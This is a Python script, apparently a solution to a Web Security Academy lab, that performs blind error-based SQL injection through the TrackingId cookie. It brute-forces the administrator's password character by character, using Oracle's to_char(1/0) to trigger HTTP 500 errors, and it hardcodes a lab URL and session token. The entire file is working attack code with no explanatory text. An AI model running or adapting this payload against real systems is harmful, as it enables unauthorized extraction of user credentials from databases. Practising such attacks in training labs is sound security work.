import requests, string

quess = ''

url = 'https://0add000403aa0f8e807e08f50063007d.web-security-academy.net/'
chars = string.ascii_lowercase + string.digits

session = 'Uh5GuVA2Zyv6xLUApXJU7FYawwnBYmSL'

searching = True

position = 1

while searching:
        for char in chars:
            headers = {'Cookie': f'TrackingId=xyz\'||(select case when substr(password,{position},1)=\'{char}\' then to_char(1/0) else \'\' end from users where username=\'administrator\')||\'; session=Uh5GuVA2Zyv6xLUApXJU7FYawwnBYmSL'}
            response = requests.get(url,headers=headers)


            if response.status_code == 500:
                quess += char
                position += 1
                print("Current password: " + quess)
                break
        else:
            print("No more valid characters found")
            exit(1)